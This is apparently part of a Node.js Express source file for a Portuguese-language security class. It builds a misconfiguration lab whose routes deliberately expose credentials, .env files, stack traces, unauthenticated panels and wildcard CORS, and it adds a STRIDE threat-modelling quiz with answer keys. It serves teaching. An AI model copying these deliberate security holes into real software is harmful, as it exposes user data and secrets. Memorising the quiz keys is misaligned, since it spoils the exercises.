                            ['1', '2'].forEach(salaId => {
                                let total = 0;
                                TESTES_IDS.forEach(testeId => {
                                    const celula = document.getElementById('cel-' + salaId + '-' + testeId);
                                    if (!celula) return;
                                    const concluidoEm = concluidos[salaId + ':' + testeId];
                                    if (concluidoEm) {
                                        total++;
                                        const dataFormatada = new Date(concluidoEm).toLocaleString('pt-BR');
                                        if (celula.dataset.concluidoEm !== concluidoEm) {
                                            celula.style.background = '#d4edda';
                                            celula.style.color = '';
                                            celula.innerHTML = '✅<br><small style="color:#666;">' + dataFormatada + '</small>';
                                            celula.dataset.concluidoEm = concluidoEm;
                                        }
                                    } else if (celula.dataset.concluidoEm) {
                                        celula.style.background = '#f8d7da';
                                        celula.style.color = '#721c24';
                                        celula.innerHTML = '❌';
                                        delete celula.dataset.concluidoEm;
                                    }
                                });
                                const contador = document.getElementById('contador-sala-' + salaId);
                                if (contador) contador.textContent = total;
                            });

                            document.getElementById('status-auto-atualizar').textContent = '🟢 Atualizando automaticamente...';
                        } catch (err) {
                            document.getElementById('status-auto-atualizar').textContent = '🔴 Falha ao atualizar: ' + err.message;
                        }
                    }

                    setInterval(atualizarPainelAutomaticamente, 5000);
                </script>
            </body>
            </html>
        `);
    } catch (error) {
        res.status(500).send(`<p style="color:red; font-family:sans-serif;">❌ Erro: ${escapeHtml(error.message)}</p>`);
    }
});

app.post('/misconfig/painel-professor/limpar/:sala', async (req, res) => {
    const { sala } = req.params;
    try {
        await pool.query('DELETE FROM misconfig_progresso WHERE sala=$1', [sala]);
        res.redirect('/misconfig/painel-professor');
    } catch (error) {
        res.status(500).send(`<p style="color:red; font-family:sans-serif;">❌ Erro: ${escapeHtml(error.message)}</p>`);
    }
});

// 1. DASHBOARD DO LAB (menu lateral com os 10 testes + atalhos para as telas "expostas")
app.get('/misconfig/:sala', exigirLoginMisconfig, (req, res) => {
    const { sala } = req.params;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório Misconfiguration - Lab ${sala}</title>
            <style>${sidebarStyleMisconfig}</style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <h2>⚙️ 10 Testes de Misconfiguration</h2>
                    <p id="contador-progresso" style="font-weight:bold; color:#0F766E;">0 / 10 concluídos</p>
                    <p>Clique em um teste para ver o passo a passo do ataque e responder o desafio.</p>
                    ${renderMenuMisconfig(sala)}
                    <button class="reset-btn" onclick="resetarProgressoMisconfig('${sala}')">🔄 Resetar Progresso do Lab ${sala}</button>
                    <a href="/misconfig/logout" class="nav-link">🚪 Sair (${escapeHtml(req.session.misconfigNomeExibicao || '')})</a>
                    <a href="/" class="nav-link">🏠 Voltar ao Hub</a>
                </div>

                <div class="main">
                    <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #0F766E 0%, #0B5D57 100%); color: white; border-radius: 8px; margin-bottom: 30px;">
                        <h1 style="margin: 0; font-size: 28px;">⚙️ Laboratório de Práticas — Lab ${sala}</h1>
                        <p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">Misconfiguration e Exposição de Dados Sensíveis - Aula Prática de Segurança</p>
                    </div>

                    <div style="background: #e9f9f7; border-left: 4px solid #0F766E; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                        <h3 style="color: #0B5D57; margin-top: 0;">📚 Como Usar:</h3>
                        <ol style="color: #555; line-height: 1.8; margin: 10px 0;">
                            <li>Escolha um teste no menu lateral (👈 são 10 desafios diferentes) e leia "O que o aluno faz" e "Ação do ataque"</li>
                            <li>Acesse diretamente as URLs/telas indicadas — todos os exercícios podem ser resolvidos sem nenhuma ferramenta externa</li>
                            <li>Quando encontrar a informação pedida, cole a resposta no campo do próprio teste e clique em "Validar Resposta"</li>
                            <li>Se a resposta estiver certa, o teste é marcado com ✅ — seu progresso fica salvo no servidor</li>
                            <li>Se quiser recomeçar do zero, use o botão de reset mais abaixo no menu lateral (👇)</li>
                        </ol>
                    </div>

                    <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                        <a href="/misconfig/${sala}/uploads" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📁</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Pasta de Uploads</h4>
                        </a>
                        <a href="/misconfig/${sala}/contato" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📞</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Contato</h4>
                        </a>
                        <a href="/misconfig/${sala}/status" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">🩺</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Status / Debug</h4>
                        </a>
                        <a href="/misconfig/${sala}/diagnostico" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📡</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Diagnóstico</h4>
                        </a>
                    </div>
                </div>
            </div>
            <script>window.SALA_ATUAL = '${sala}';</script>
            <script>${scriptAccordionMisconfig}</script>
            <script>carregarProgressoDoServidorMisconfig('${sala}');</script>
        </body>
        </html>
    `);
});

// 2. Exercício 1 — backup de banco esquecido na pasta pública
app.get('/misconfig/:sala/backup-loja.sql', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/plain').send(
`-- Backup automático gerado em 03/01/2024 02:00:11
-- Sistema: TechNova Sistemas — Banco de Dados (cópia de homologação)
BEGIN;

CREATE TABLE usuarios (id INTEGER, email VARCHAR(100), senha VARCHAR(50), perfil VARCHAR(20));

INSERT INTO usuarios (id, email, senha, perfil) VALUES
  (1, 'admin@technova-sistemas.com', '${c.backupSenha}', 'admin'),
  (2, 'suporte@technova-sistemas.com', 'Sup0rte#temp', 'user');

COMMIT;
-- FIM DO BACKUP
`);
});

// 3. Exercício 2 — arquivo .env exposto
app.get('/misconfig/:sala/.env', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/plain').send(
`# Arquivo de configuração — NÃO deveria estar acessível publicamente
PORT=3000
NODE_ENV=homologacao
DB_HOST=db-interno.technova-sistemas.local
DB_USER=app_user
DB_PASS=********
API_KEY_PAGAMENTO=${c.envApiKey}
SESSION_SECRET=********
`);
});

// 4. Exercício 3 — listagem de diretório habilitada
app.get('/misconfig/:sala/uploads', (req, res) => {
    const { sala } = req.params;
    res.send(paginaMisconfig(sala, 'Index of /uploads', `
        <h1 style="font-size:18px; font-family:monospace;">Index of /misconfig/${sala}/uploads</h1>
        <hr>
        <ul style="font-family:monospace; line-height:1.8;">
            <li><a href="/misconfig/${sala}/uploads/contrato-cliente.pdf">contrato-cliente.pdf</a></li>
            <li><a href="/misconfig/${sala}/uploads/relatorio-financeiro-2024.txt">relatorio-financeiro-2024.txt</a></li>
            <li><a href="/misconfig/${sala}/uploads/foto-evento.jpg">foto-evento.jpg</a></li>
        </ul>
        <hr>
    `));
});

app.get('/misconfig/:sala/uploads/relatorio-financeiro-2024.txt', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/plain').send(
`RELATÓRIO FINANCEIRO INTERNO — NÃO DIVULGAR
Trimestre: Q4 2024
Faturamento confidencial do trimestre: ${c.relatorioFaturamento}
`);
});

app.get('/misconfig/:sala/uploads/contrato-cliente.pdf', (req, res) => {
    res.type('text/plain').send('Arquivo de exemplo (sem conteúdo sensível) — usado apenas para simular a listagem de diretório.');
});

app.get('/misconfig/:sala/uploads/foto-evento.jpg', (req, res) => {
    res.type('text/plain').send('Arquivo de exemplo (sem conteúdo sensível) — usado apenas para simular a listagem de diretório.');
});

// 5. Exercício 4 — mensagem de erro detalhada (stack trace)
app.get('/misconfig/:sala/relatorio/:id', (req, res) => {
    const { sala, id } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    if (!/^\d+$/.test(id)) {
        return res.status(500).type('text/plain').send(
`Error: Cannot find relatorio with id "${id}"
    at buscarRelatorio (/srv/technova/app/routes/relatorios.js:58:13)
    at conectarBanco (/srv/technova/app/db.js:42:9)
    at processarRequisicao (/srv/technova/app/server.js:301:5)

Banco de dados (ambiente de homologação):
postgres://relatorios_user:${c.stacktraceSenha}@10.0.4.12:5432/technova_homolog

NODE_ENV=homologacao | versao_app=2.3.1
`);
    }
    res.send(paginaMisconfig(sala, 'Relatório', `<p>📄 Relatório #${escapeHtml(id)} carregado normalmente. Nada de especial por aqui — tente um valor que não seja número.</p>`));
});

// 6. Exercício 5 — painel administrativo sem autenticação
app.get('/misconfig/:sala/painel-interno', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.send(paginaMisconfig(sala, 'Painel Interno', `
        <h2>🏢 Painel Administrativo Interno — TechNova Sistemas</h2>
        <p style="color:#666;">Esta área é de uso exclusivo da equipe interna.</p>
        <div style="background:#e9f9f7; border-left:4px solid #0F766E; padding:15px; border-radius:4px; margin-top:15px;">
            <p><strong>Código de acesso ao cofre de documentos:</strong> ${escapeHtml(c.painelCofreCodigo)}</p>
            <p><strong>Funcionários ativos:</strong> 48</p>
            <p><strong>Último backup completo:</strong> 03/01/2024</p>
        </div>
    `));
});

// 7. Exercício 6 — credenciais esquecidas em comentário HTML
app.get('/misconfig/:sala/contato', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><title>Fale Conosco - TechNova Sistemas</title></head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            <!-- TODO: remover usuário de teste antes de produção: qa_temp / ${c.comentarioSenhaQaTemp} -->
            <h2>📞 Fale Conosco</h2>
            <p>Preencha o formulário abaixo e nossa equipe responde em até 2 dias úteis.</p>
            <form>
                <label>Nome:</label><br><input type="text" style="width:100%; padding:8px; margin:6px 0;"><br>
                <label>Mensagem:</label><br><textarea style="width:100%; padding:8px; margin:6px 0;" rows="4"></textarea><br>
                <button type="button" disabled style="padding:10px 18px;">Enviar (desativado no laboratório)</button>
            </form>
            <br>
            <a href="/misconfig/${sala}" style="color:#0F766E; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `);
});

// 8. Exercício 7 — endpoint de diagnóstico expõe dados internos
app.get('/misconfig/:sala/status', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.json({
        status: 'ok',
        ambiente: 'homologacao',
        versao_node: process.version,
        servidor_interno: '10.0.4.12',
        chave_sessao_interna: c.statusChaveSessao
    });
});

// 9. Exercício 8 — cabeçalho de resposta revela informação de build interna
app.get('/misconfig/:sala/diagnostico', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.set('X-Internal-Build', c.diagnosticoBuildHeader);
    res.send(paginaMisconfig(sala, 'Diagnóstico', `
        <h2>🩺 Diagnóstico do Servidor</h2>
        <p>Cabeçalhos enviados nesta resposta:</p>
        <pre style="background:#f5f5f5; padding:12px; border-radius:4px;">Content-Type: text/html
X-Internal-Build: ${escapeHtml(c.diagnosticoBuildHeader)}</pre>
    `));
});

// 10. Exercício 9 — exportação pública de dados sensíveis (CSV sem autenticação)
app.get('/misconfig/:sala/exportar/clientes.csv', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/csv').send(
`nome,email,cpf,cartao_mascarado,observacao
Joao Pedro Lima,joao.lima@cliente.com,123.***.***-09,**** **** **** 4471,
Fernanda Costa,fernanda.costa@cliente.com,234.***.***-18,**** **** **** 2290,
Marcelo Tanaka (VIP),marcelo.tanaka@cliente.com,345.***.***-27,**** **** **** 8834,${c.csvVipCodigo}
Juliana Prado,juliana.prado@cliente.com,456.***.***-36,**** **** **** 1190,
`);
});

// 11. Exercício 10 — CORS mal configurado (Access-Control-Allow-Origin: *)
app.get('/misconfig/:sala/api/pedidos-internos', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.set('Access-Control-Allow-Origin', '*');
    const dados = {
        pedidos: [
            { numero: 9001, item: 'Licença Corporativa Anual', valor: 4200.00 },
            { numero: 9002, item: 'Consultoria de Migração de Dados', valor: 18900.00 }
        ],
        nota_interna: c.apiNotaInterna
    };
    res.send(paginaMisconfig(sala, 'API de Pedidos Internos', `
        <h2>📦 API Interna de Pedidos</h2>
        <p>Esta API não exige login e devolve dados internos da empresa.</p>
        <h3>Resposta (JSON):</h3>
        <pre style="background:#f5f5f5; padding:12px; border-radius:4px;">${escapeHtml(JSON.stringify(dados, null, 2))}</pre>
        <h3>Cabeçalhos enviados nesta resposta:</h3>
        <pre style="background:#f5f5f5; padding:12px; border-radius:4px;">Access-Control-Allow-Origin: *</pre>
        <p>⚠️ Isso significa que um script rodando em <strong>qualquer site da internet</strong> pode chamar essa API com <code>fetch()</code> e ler essa resposta — não só o nosso laboratório.</p>
    `));
});

// 12. PROGRESSO — usado pelo dashboard para marcar os ✅ vindos do banco
app.get('/misconfig/:sala/progresso', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT teste_id FROM misconfig_progresso WHERE sala=$1', [sala]);
        res.json({ concluidos: r.rows.map(row => row.teste_id) });
    } catch (error) {
        res.status(500).json({ concluidos: [], erro: error.message });
    }
});

// 13. VALIDAÇÃO DAS RESPOSTAS
app.post('/misconfig/:sala/validar', async (req, res) => {
    const { sala } = req.params;
    const { testeId, resposta } = req.body;
    const esperado = (RESPOSTAS_MISCONFIG[sala] || {})[testeId];
    if (!esperado) return res.status(400).json({ correto: false, erro: 'Teste desconhecido' });

    const correto = normalizarRespostaMisconfig(resposta) === normalizarRespostaMisconfig(esperado);

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO misconfig_progresso (sala, teste_id) VALUES ($1, $2) ON CONFLICT (sala, teste_id) DO UPDATE SET concluido_em = NOW()',
                [sala, testeId]
            );
        } catch (error) {
            console.error('Erro ao registrar progresso de Misconfiguration:', error.message);
        }
    }

    res.json({ correto });
});

// 14. RESET DO PROGRESSO (não há outro dado mutável para restaurar neste lab)
app.post('/misconfig/:sala/reset', async (req, res) => {
    const { sala } = req.params;
    try {
        await pool.query('DELETE FROM misconfig_progresso WHERE sala=$1', [sala]);
        res.json({ sucesso: true, mensagem: `✅ Progresso do Lab ${sala} de Misconfiguration resetado com sucesso!` });
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});


// =====================================
// LAB 5: STRIDE — MODELAGEM DE AMEAÇAS
// Login individual por aluno (9 alunos)
// Exercícios misturados BancoPix (🏦) + MedConsulta (🏥) — embaralhados por aluno
// =====================================

// STRIDE na barra lateral como referência clicável; exercícios como cards no centro.

// Conceitos exibidos na barra lateral — o aluno clica para ler antes de responder
const STRIDE_CONCEITOS = [
    { letra: 'S', nome: 'Spoofing', cor: '#DC2626',
      descricao: 'Fingir ser outro usuário, sistema ou serviço para ganhar acesso não autorizado. Acontece quando a identidade não é verificada corretamente.',
      controle: 'Autenticação forte (MFA, certificados digitais, senhas robustas)' },
    { letra: 'T', nome: 'Tampering', cor: '#D97706',
      descricao: 'Modificar dados sem autorização — em trânsito (interceptação na rede) ou em repouso (alteração direta no banco ou formulário).',
      controle: 'Assinaturas digitais, hashes de integridade, validação server-side' },
    { letra: 'R', nome: 'Repudiation', cor: '#7C3AED',
      descricao: 'Capacidade de negar ter realizado uma ação por falta de evidências registradas. O sistema não consegue provar quem fez o quê.',
      controle: 'Logs de auditoria imutáveis, timestamps assinados digitalmente' },
    { letra: 'I', nome: 'Information Disclosure', cor: '#2563EB',
      descricao: 'Exposição de dados sigilosos a quem não deveria ter acesso — de forma direta (arquivo acessível) ou indireta (mensagem de erro reveladora).',
      controle: 'Criptografia, tratamento de erros genérico, classificação de dados sensíveis' },
    { letra: 'D', nome: 'Denial of Service', cor: '#374151',
      descricao: 'Tornar um sistema ou recurso indisponível para usuários legítimos, por sobrecarga de requisições ou consumo excessivo de recursos.',
      controle: 'Rate limiting, WAF, infraestrutura resiliente, circuit breaker' },
    { letra: 'E', nome: 'Elevation of Privilege', cor: '#059669',
      descricao: 'Obter permissões além das que foram concedidas — por exemplo, um usuário comum acessar funcionalidades de administrador.',
      controle: 'Verificação de autorização sempre no servidor, princípio do menor privilégio' }
];

// Conteúdo dos 10 exercícios — mix 5 BancoPix + 5 MedConsulta, uma letra STRIDE por exercício
const CONTEUDO_STRIDE = {
    stride1: {
        sistema: 'MedConsulta', emoji: '🏥', badge: 'saude',
        cenario: `<p>O MedConsulta permite que médicos façam login usando apenas o número do CRM (Conselho Regional de Medicina), que é um dado <strong>público</strong> disponível no site do CFM. Não existe verificação de senha nem segundo fator. Um atacante consulta o CRM do Dr. Carlos no site do CFM e faz login no sistema como se fosse ele — cancelando consultas e acessando prontuários de pacientes.</p>`,
        pergunta: `Qual é a <strong>letra do STRIDE</strong> que representa a ameaça descrita no cenário acima?`,
        dica: `Pense em IDENTIDADE — o atacante está fingindo ser outra pessoa. Consulte a barra lateral.`
    },
    stride2: {
        sistema: 'BancoPix', emoji: '🏦', badge: 'banco',
        cenario: `<p>O BancoPix gera links de pagamento com o valor embutido na URL: <code>/pagar?valor=1500.00&amp;conta_destino=55443</code>. Um cliente descobre que pode editar a URL diretamente no navegador, mudando para <code>valor=0.01</code>, e consegue pagar R$ 0,01 em vez de R$ 1.500. O servidor não revalida o valor recebido — aceita qualquer número que vier na URL.</p>`,
        pergunta: `Qual é a <strong>letra do STRIDE</strong> que representa a ameaça descrita no cenário acima?`,
        dica: `O dado original foi alterado sem autorização. Qual categoria trata de MODIFICAÇÃO de dados?`
    },
    stride3: {
        sistema: 'MedConsulta', emoji: '🏥', badge: 'saude',
        cenario: `<p>A Dra. Fernanda acessa o prontuário da paciente Ana às 23h e exclui uma anotação médica que poderia indicar negligência em um procedimento. O MedConsulta <strong>não registra</strong> quem acessou um prontuário, nem quais alterações foram feitas ou quando. Em uma investigação posterior, a Dra. Fernanda nega ter deletado qualquer registro. Não há como provar o contrário.</p>`,
        pergunta: `Qual é a <strong>letra do STRIDE</strong> que representa a ameaça descrita no cenário acima?`,
        dica: `A médica consegue NEGAR a ação por falta de registro. Qual categoria é sobre NEGAÇÃO?`
    },
    stride4: {
        sistema: 'BancoPix', emoji: '🏦', badge: 'banco',
        cenario: `<p>Ao acessar <code>/extrato?id=abc</code> (um ID inválido), o BancoPix responde com a mensagem de erro técnica completa: <code style="font-size:11px;">NullPointerException at BalanceService.java:143 — jdbc:postgresql://db-prod-01.bancoPix.internal:5432/bancoPix_prod?user=extrato_svc&amp;password=Xtr4t0_Pr0d#2024</code>. Um atacante anota a senha e o endereço interno do banco de dados.</p>`,
        pergunta: `Qual é a <strong>letra do STRIDE</strong> que representa a ameaça descrita no cenário acima?`,
        dica: `Dados sigilosos (senha, endereço interno) ficaram visíveis para quem não deveria ver. Qual categoria é sobre EXPOSIÇÃO?`
    },
    stride5: {
        sistema: 'MedConsulta', emoji: '🏥', badge: 'saude',
        cenario: `<p>O MedConsulta cria um slot único por horário de consulta: <code>/agendar/slot/20241215-09h00/dr-carlos</code>. Um robô cria contas falsas rapidamente e agenda automaticamente <strong>todos</strong> os horários disponíveis dos próximos 6 meses. Pacientes reais não encontram nenhuma vaga. Os médicos ficam com agenda cheia de consultas fantasmas que nunca acontecerão.</p>`,
        pergunta: `Qual é a <strong>letra do STRIDE</strong> que representa a ameaça descrita no cenário acima?`,
        dica: `Os recursos (horários) ficaram indisponíveis para usuários legítimos. Qual categoria é sobre DISPONIBILIDADE?`
    },
    stride6: {
        sistema: 'BancoPix', emoji: '🏦', badge: 'banco',
        cenario: `<p>O painel administrativo do BancoPix valida permissões apenas no JavaScript do navegador: <code>if (usuario.perfil === "admin") mostrarPainel()</code>. Um cliente comum abre o console do navegador, executa <code>usuario.perfil = "admin"</code> e passa a ter acesso total ao painel — pode cancelar contas, ver dados de todos os clientes e bloquear transferências. O servidor nunca verifica se ele realmente é admin.</p>`,
        pergunta: `Qual é a <strong>letra do STRIDE</strong> que representa a ameaça descrita no cenário acima?`,
        dica: `O usuário ganhou poderes que não lhe foram concedidos. Qual categoria é sobre ESCALADA de privilégios?`
    },
    stride7: {
        sistema: 'BancoPix', emoji: '🏦', badge: 'banco',
        cenario: `<p>O time de segurança do BancoPix mapeia os componentes do sistema:</p>
<pre style="background:#F8FAFC;padding:10px;border-radius:6px;font-size:11px;overflow:auto;margin:10px 0;">
[Navegador do Cliente]
        | HTTPS/TLS
[Servidor BancoPix (Node.js)]
        | TCP interno
[Banco de Dados PostgreSQL]
        | API REST / JSON
[Antifraude S.A. — serviço terceirizado de detecção de fraude]
        | Webhook de retorno
[Servidor BancoPix (Node.js)]
</pre>
<p>A <strong>fronteira de confiança (trust boundary)</strong> mais crítica é aquela que separa componentes internos do BancoPix de um sistema <strong>externo que não controlamos</strong>. Se esse componente externo for comprometido, ele poderia enviar dados adulterados para nossas decisões de aprovação de crédito.</p>`,
        pergunta: `Qual é o nome <strong>exato</strong> do componente externo (terceirizado) no diagrama com o qual o BancoPix tem a fronteira de confiança mais crítica?`,
        dica: `Procure no diagrama o componente que NÃO pertence ao BancoPix — o que nenhum desenvolvedor da empresa controla.`
    },
    stride8: {
        sistema: 'MedConsulta', emoji: '🏥', badge: 'saude',
        cenario: `<p>O threat model do MedConsulta identificou a seguinte ameaça de <strong>Repudiation</strong>: <em>"Médicos podem editar ou deletar anotações em prontuários sem deixar rastro — impossibilitando auditorias, investigações de negligência e conformidade com a LGPD."</em></p>
<p style="margin-top:8px;">A equipe propõe implementar um sistema que registre automaticamente, em uma tabela separada e <strong>imutável</strong>, toda operação realizada em prontuários: quem acessou, quando, o que foi lido, criado, editado ou deletado, incluindo os dados antes e depois de cada modificação.</p>`,
        pergunta: `Como é chamado (em <strong>português</strong>) o controle de segurança descrito acima, que registra detalhadamente todas as ações realizadas no sistema?`,
        dica: `Em inglês seria "audit log". Responda em português — dois palavras começando por "log de...".`
    },
    stride9: {
        sistema: 'BancoPix', emoji: '🏦', badge: 'banco',
        cenario: `<p>O BancoPix identificou 3 ameaças em seu threat model:</p>
<ul style="font-size:12px;line-height:1.8;padding-left:18px;margin:10px 0;">
<li><strong>A)</strong> A comunicação entre o app mobile e o servidor <strong>não usa TLS</strong> — qualquer atacante na mesma rede Wi-Fi consegue interceptar TODAS as transferências de QUALQUER cliente, sem precisar de conta.</li>
<li><strong>B)</strong> Um funcionário insatisfeito pode deletar registros de transações sem que haja log de auditoria.</li>
<li><strong>C)</strong> O sistema aceita senhas de apenas 4 dígitos — um bot pode tentar as 10.000 combinações para um CPF específico.</li>
</ul>
<p>A equipe deve endereçar <strong>primeiro</strong> a ameaça que pode comprometer dados de <strong>todos os clientes simultaneamente</strong>, sem precisar de uma conta no sistema.</p>`,
        pergunta: `Qual é a <strong>letra (A, B ou C)</strong> da ameaça que deve ser priorizada?`,
        dica: `Qual ameaça afeta TODA comunicação de QUALQUER cliente — sem precisar de login?`
    },
    stride10: {
        sistema: 'MedConsulta', emoji: '🏥', badge: 'saude',
        cenario: `<p>O MedConsulta vai lançar a funcionalidade de <strong>Telemedicina</strong>. O fluxo completo:</p>
<ol style="font-size:12px;line-height:1.8;padding-left:18px;margin:10px 0;">
<li>Paciente solicita consulta online via app</li>
<li>Sistema encontra médico disponível: <code>/telemedicina/match?especialidade=cardiologia</code> — <strong>sem autenticação</strong></li>
<li>Videochamada via <strong>VideoMed S.A.</strong> (terceiro) com token na URL: <code>/videomed?token=abc123</code></li>
<li>Médico emite laudo: <code>/laudos/criar?consulta_id=XXX</code> — sem validar se é o médico correto</li>
</ol>
<p>Foram identificadas 3 ameaças STRIDE: (1) <code>/telemedicina/match</code> expõe dados de todos os médicos sem login → <em>Information Disclosure</em>; (2) tokens na URL ficam em logs do servidor → <em>Information Disclosure</em>; (3) qualquer médico pode criar laudo de qualquer consulta → <em>Tampering</em>. O documento de threat model deste fluxo recebeu o código de revisão <strong>REV-MEDCON-4419</strong>.</p>`,
        pergunta: `Qual é o <strong>código de revisão</strong> atribuído ao threat model da funcionalidade de Telemedicina?`,
        dica: `O código está no texto do cenário — procure por "REV-".`
    }
};

const testesStride = [
    { id: 'stride1',  nome: '1️⃣ S — Spoofing' },
    { id: 'stride2',  nome: '2️⃣ T — Tampering' },
    { id: 'stride3',  nome: '3️⃣ R — Repudiation' },
    { id: 'stride4',  nome: '4️⃣ I — Information Disclosure' },
    { id: 'stride5',  nome: '5️⃣ D — Denial of Service' },
    { id: 'stride6',  nome: '6️⃣ E — Elevation of Privilege' },
    { id: 'stride7',  nome: '7️⃣ Fronteira de Confiança' },
    { id: 'stride8',  nome: '8️⃣ Controle de Mitigação' },
    { id: 'stride9',  nome: '9️⃣ Priorização de Risco' },
    { id: 'stride10', nome: '🔟 Threat Model Completo' }
];

// Respostas aceitas (arrays = múltiplas variantes normalizadas)
const RESPOSTAS_STRIDE = {
    stride1:  ['s', 'spoofing', 'falsificacao', 'falsificacao de identidade'],
    stride2:  ['t', 'tampering', 'adulteracao', 'adulteracao de dados'],
    stride3:  ['r', 'repudiation', 'repudio'],
    stride4:  ['i', 'information disclosure', 'divulgacao de informacoes', 'divulgacao'],
    stride5:  ['d', 'denial of service', 'negacao de servico', 'dos'],
    stride6:  ['e', 'elevation of privilege', 'elevacao de privilegio', 'escalada de privilegio', 'elevacao'],
    stride7:  ['antifraude sa', 'antifraude s a', 'antifraude'],
    stride8:  ['log de auditoria', 'logs de auditoria', 'trilha de auditoria', 'audit log', 'auditoria'],
    stride9:  ['a'],
    stride10: ['rev-medcon-4419', 'revmedcon4419', 'medcon4419']
};

function normalizarRespostaStride(s) {
    return String(s || '').normalize('NFD').replace(/[̀-ͯ]/g, '').toLowerCase().replace(/[^a-z0-9]/g, '');
}

// Embaralha a ordem dos exercícios de forma determinística pelo nome do aluno —
// cada aluno vê os 10 exercícios em ordem diferente, mas sempre a mesma ao recarregar.
function shuffleParaAluno(arr, aluno) {
    const result = [...arr];
    let seed = 0;
    for (const c of aluno) seed = ((seed * 31) + c.charCodeAt(0)) & 0x7FFFFFFF;
    for (let i = result.length - 1; i > 0; i--) {
        seed = ((seed * 1664525) + 1013904223) & 0x7FFFFFFF;
        const j = seed % (i + 1);
        [result[i], result[j]] = [result[j], result[i]];
    }
    return result;
}

function renderSidebarConceitos() {
    return STRIDE_CONCEITOS.map(c => `
        <div class="stride-category">
            <div class="stride-cat-header" onclick="toggleConceito('${c.letra}')">
                <span class="stride-letter" style="background:${c.cor};">${c.letra}</span>
                <span class="stride-cat-name">${c.nome}</span>
                <span class="stride-cat-arrow" id="arrow-${c.letra}">▶</span>
            </div>
            <div class="stride-cat-body" id="conceito-${c.letra}">
                <p><strong>O que é:</strong> ${c.descricao}</p>
                <p style="margin-top:7px;"><strong>Controle:</strong> ${c.controle}</p>
            </div>
        </div>
    `).join('');
}

function renderExerciciosStride(aluno) {
    const ordem = shuffleParaAluno(testesStride, aluno);
    return ordem.map((teste, idx) => {
        const ex = CONTEUDO_STRIDE[teste.id];
        const badgeClasse = ex.badge === 'banco' ? 'badge-banco' : 'badge-saude';
        return `
            <div class="exercise-card" id="card-${teste.id}">
                <div class="card-meta">
                    <span class="badge-sistema ${badgeClasse}">${ex.emoji} ${ex.sistema}</span>
                    <span class="badge-num">Exercício ${idx + 1} de 15</span>
                    <span class="badge-check" id="check-${teste.id}">⬜</span>
                </div>
                <div class="cenario-box">${ex.cenario}</div>
                <div class="pergunta-box">
                    <p class="pergunta-text">${ex.pergunta}</p>
                    <p class="dica-text">💡 ${ex.dica}</p>
                    <input type="text" id="resp-${teste.id}" class="resp-input" placeholder="Digite sua resposta...">
                    <button class="validar-btn" onclick="validarStride('${teste.id}')">✅ Validar</button>
                    <p class="feedback-text" id="fb-${teste.id}"></p>
                </div>
            </div>
        `;
    }).join('');
}

const estiloStride = `
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: sans-serif; background: #F1F5F9; }
    .container { display:flex; min-height:100vh; }
    .sidebar {
        width: 270px; background: #fff; padding: 18px 14px;
        border-right: 2px solid #E2E8F0;
        position: sticky; top: 0; height: 100vh; overflow-y: auto;
        display: flex; flex-direction: column;
    }
    .sidebar-brand { margin-bottom: 14px; }
    .sidebar-brand h2 { font-size: 15px; color: #1e1b4b; margin-bottom: 3px; }
    .sidebar-brand p { font-size: 12px; color: #64748B; }
    .contador-box { background: #eef2ff; border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; }
    .contador-box p { font-size: 13px; font-weight: 700; color: #4338CA; }
    .stride-section-title { font-size: 10px; font-weight: 700; color: #94A3B8; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 6px; }
    .stride-hint { font-size: 11px; color: #6B7280; margin-bottom: 10px; line-height: 1.5; }
    .stride-category { margin-bottom: 5px; }
    .stride-cat-header {
        display: flex; align-items: center; gap: 8px;
        padding: 8px 10px; border-radius: 6px; cursor: pointer;
